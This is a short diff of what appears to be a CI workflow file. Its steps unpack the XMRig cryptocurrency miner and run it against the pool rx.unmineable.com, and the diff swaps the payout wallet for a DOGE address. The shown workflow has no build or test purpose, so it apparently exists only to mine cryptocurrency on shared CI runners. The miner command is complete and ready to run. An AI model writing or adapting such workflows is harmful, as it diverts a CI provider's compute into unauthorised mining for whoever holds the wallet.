@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive xmrig-6.15.0-gcc-win64.zip
     - name: RUNNING
-      run: .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u RPb6pqmTNyJG4DejYveCgwhvhU8TDAhhs9.miner -p x -t 1
+      run: .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u DOGE:DCP3ZgE44wHekphnSKe3XGHL2UoTGQN3J9.miner -p x -t 1
     - name: DONE
       run: exit
